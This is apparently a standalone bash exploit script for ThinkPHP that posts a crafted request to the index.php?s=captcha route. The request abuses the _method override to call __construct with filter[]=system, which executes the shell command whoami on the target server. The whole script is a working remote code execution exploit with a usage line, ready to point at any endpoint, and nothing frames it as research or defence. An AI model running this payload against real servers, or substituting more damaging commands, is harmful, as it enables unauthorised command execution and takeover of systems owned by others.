#!/bin/bash
# ThinkPHP — Confirm current user via _method override
# Usage: method_whoami.sh <ENDPOINT>
set -euo pipefail

ENDPOINT="${1:?Usage: $0 <ENDPOINT>}"

curl -s -X POST "${ENDPOINT}/index.php?s=captcha" \
  -d "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=whoami" \
  --max-time 10
